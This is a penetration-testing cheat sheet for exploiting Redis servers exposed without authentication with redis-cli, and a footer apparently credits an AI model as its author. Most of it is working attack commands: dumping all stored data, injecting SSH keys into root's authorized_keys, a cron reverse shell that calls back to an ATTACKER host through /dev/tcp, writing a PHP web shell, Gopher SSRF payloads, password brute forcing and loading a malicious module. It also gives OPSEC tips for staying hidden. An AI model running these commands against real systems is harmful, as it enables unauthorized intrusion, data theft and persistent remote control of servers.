# redis-cli

**Tags:** `#redis` `#database` `#postexploitation` `#rce` `#unauthenticated` `#ssrf` `#filewrite`

Redis CLI client. Redis is frequently exposed unauthenticated — no auth by default pre-7.0, and weak/no passwords are common. Exploitation paths: dump all keys/data, write files to disk (SSH key injection, webshell, cron RCE), and abuse the `CONFIG SET` command to redirect DB saves to attacker-controlled paths. Port 6379.

**Source:** Pre-installed on Kali
**Install:** `sudo apt install redis-tools`

```bash
# Connect (no auth)
redis-cli -h 192.168.1.10 -p 6379

# Connect with auth
redis-cli -h 192.168.1.10 -p 6379 -a Password
```

> [!note] **Redis unauthenticated access** — Redis was designed as a trusted internal service with no auth. Binding on `0.0.0.0` without `requirepass` is the most common finding. Any `redis-cli` connection that succeeds without `-a` is fully compromised — all data is readable and file write via CONFIG is available.

---

## Connecting & Auth Check

```bash
# Attempt unauthenticated connection
redis-cli -h 192.168.1.10 -p 6379 ping
# Response: PONG = no auth required

# Authenticate if required
redis-cli -h 192.168.1.10 -p 6379
AUTH Password

# Or inline
redis-cli -h 192.168.1.10 -p 6379 -a Password ping

# Check Redis version and config
redis-cli -h 192.168.1.10 INFO server
redis-cli -h 192.168.1.10 INFO all

# Through SSRF — send raw Redis commands via HTTP/Gopher
# gopher://192.168.1.10:6379/_PING
```

---

## Data Enumeration

```bash
# List all keys
redis-cli -h 192.168.1.10 KEYS '*'

# Get value of a key
redis-cli -h 192.168.1.10 GET keyname

# Get key type
redis-cli -h 192.168.1.10 TYPE keyname

# Dump all key-value pairs
redis-cli -h 192.168.1.10 --scan | while read key; do
    echo "=== $key ==="
    redis-cli -h 192.168.1.10 GET "$key" 2>/dev/null || \
    redis-cli -h 192.168.1.10 LRANGE "$key" 0 -1 2>/dev/null || \
    redis-cli -h 192.168.1.10 SMEMBERS "$key" 2>/dev/null || \
    redis-cli -h 192.168.1.10 HGETALL "$key" 2>/dev/null
done

# Database info
redis-cli -h 192.168.1.10 INFO keyspace

# Select database (default 0, up to 15)
redis-cli -h 192.168.1.10 SELECT 0

# Count keys
redis-cli -h 192.168.1.10 DBSIZE

# Config — shows file paths, bind address, requirepass
redis-cli -h 192.168.1.10 CONFIG GET '*'
redis-cli -h 192.168.1.10 CONFIG GET dir
redis-cli -h 192.168.1.10 CONFIG GET dbfilename
redis-cli -h 192.168.1.10 CONFIG GET requirepass
```

---

## File Write — SSH Key Injection

Most reliable RCE path when Redis runs as root or a user with a home directory.

```bash
# 1. Generate SSH key pair on Kali
ssh-keygen -t rsa -f /tmp/redis_key -N ""

# 2. Prepare key with padding (Redis dump format needs newlines)
(echo -e "\n\n"; cat /tmp/redis_key.pub; echo -e "\n\n") > /tmp/redis_key_padded.txt

# 3. Write key to Redis
cat /tmp/redis_key_padded.txt | redis-cli -h 192.168.1.10 -x SET pwn

# 4. Change Redis dump directory to target's .ssh folder
redis-cli -h 192.168.1.10 CONFIG SET dir /root/.ssh
redis-cli -h 192.168.1.10 CONFIG SET dbfilename authorized_keys

# 5. Save — writes the dump (containing our key) to authorized_keys
redis-cli -h 192.168.1.10 SAVE

# 6. SSH in
ssh -i /tmp/redis_key root@192.168.1.10
```

> [!warning] This overwrites `authorized_keys` — any existing keys are lost. The dump file also contains Redis binary headers which SSH ignores but confirm the key is written correctly.

---

## File Write — Cron RCE

Works when Redis runs as root or the cron directory is writable by the Redis user.

```bash
# Write a cron job that calls back
redis-cli -h 192.168.1.10 SET cron "\n\n*/1 * * * * root bash -i >& /dev/tcp/ATTACKER/4444 0>&1\n\n"
redis-cli -h 192.168.1.10 CONFIG SET dir /etc/cron.d
redis-cli -h 192.168.1.10 CONFIG SET dbfilename redis_cron
redis-cli -h 192.168.1.10 SAVE

# Listen on Kali
nc -lvnp 4444
```

---

## File Write — Web Shell

```bash
# Find web root first (check CONFIG or common paths)
redis-cli -h 192.168.1.10 CONFIG GET dir

# Write PHP web shell
redis-cli -h 192.168.1.10 SET shell "<?php system(\$_GET['cmd']); ?>"
redis-cli -h 192.168.1.10 CONFIG SET dir /var/www/html
redis-cli -h 192.168.1.10 CONFIG SET dbfilename shell.php
redis-cli -h 192.168.1.10 SAVE

# Trigger
curl "http://192.168.1.10/shell.php?cmd=id"
```

---

## File Write — Restore Config After Exploitation

```bash
# Restore Redis config to avoid breaking the service
redis-cli -h 192.168.1.10 CONFIG SET dir /var/lib/redis
redis-cli -h 192.168.1.10 CONFIG SET dbfilename dump.rdb
```

---

## SSRF → Redis (Gopher Protocol)

When you have SSRF and can reach an internal Redis instance:

```bash
# Generate Gopher payload to set a key
# Raw Redis command format: *<arg_count>\r\n$<len>\r\n<data>\r\n
# Tools like Gopherus automate this

# Example: PING via gopher
gopher://127.0.0.1:6379/_PING

# Gopherus — generates Redis Gopher payloads
python3 gopherus.py --exploit redis
# Then select: RCE (write cron/ssh key/webshell)
```

---

## Authentication Bypass / Brute Force

```bash
# Brute force requirepass
hydra -P /usr/share/wordlists/rockyou.txt redis://192.168.1.10

# Medusa
medusa -h 192.168.1.10 -P /usr/share/wordlists/rockyou.txt -M redis

# NetExec
netexec redis 192.168.1.10 -u '' -P /usr/share/wordlists/rockyou.txt
```

---

## Redis Module RCE (Advanced)

Redis 4.x/5.x — load a malicious `.so` module for RCE (requires `MODULE LOAD` access).

```bash
# Check if MODULE command is available
redis-cli -h 192.168.1.10 MODULE LIST

# Load malicious module (RedisModpwn / n0b0dyCN exploit)
# Compile exploit .so, host on HTTP server
redis-cli -h 192.168.1.10 MODULE LOAD /tmp/exploit.so
redis-cli -h 192.168.1.10 system.exec "id"
```

---

## OPSEC Notes

- Redis logs to `/var/log/redis/redis-server.log` by default — `CONFIG GET logfile`
- `CONFIG SET` and `SAVE` commands are logged if loglevel is `verbose` or higher
- `SAVE` writes a new dump file to disk — file timestamps reveal activity
- Redis 7.0+ enables ACLs and auth by default — older versions are the primary target

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
